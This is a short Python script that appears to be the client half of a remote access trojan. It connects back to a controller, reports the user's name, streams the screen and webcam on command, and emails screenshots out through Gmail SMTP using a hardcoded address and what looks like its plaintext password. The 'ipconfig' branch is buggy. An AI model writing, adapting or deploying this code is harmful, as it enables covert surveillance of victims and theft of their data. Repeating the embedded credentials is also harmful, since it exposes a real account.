from PIL import ImageGrab
from vidstream import *
import socket
import getpass
import smtplib
import base64
import os
import platform
clientHOST = "192.168.1.199"
clientPORT = 443
BUFFER_SIZE = 1024
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((clientHOST, clientPORT))
s.send(str(getpass.getuser()).encode("utf-8"))
while True:
    Handler_DATA = s.recv(BUFFER_SIZE).decode("utf-8")
    if Handler_DATA == "screenshare":
        screen = ScreenShareClient(clientHOST, 4833)
        screen.start_stream()
    elif Handler_DATA == "webcam_stream":
        webcam = CameraClient(clientHOST, 4833)
        webcam.start_stream()
    elif Handler_DATA == "screenshot":
        screenshot = ImageGrab.grab()
        file = "screenshot.jpg"
        screenshot.save(file)
        f = open('screenshot.jpg', 'rb')
        data=f.read()
        data=base64.b64encode(data)
        f.close()
        os.remove(file)
        smtp = smtplib.SMTP('smtp.gmail.com', 587)
        smtp.starttls()
        smtp.login("hydrostrafeyt@gmail.com", "Sigalfunes0587072344#Itay%")
        message = data
        smtp.sendmail("hydrostrafeyt@gmail.com", "hydrostrafeyt@gmail.com", message)
        smtp.quit()
    elif Handler_DATA == "ipconfig":
        if platform.system() == "Windows":
            result = os.system('ifconfig')
        if platform.system() == "Linux":
            result2 = os.system("ip a")
            s.send(result, result2)
            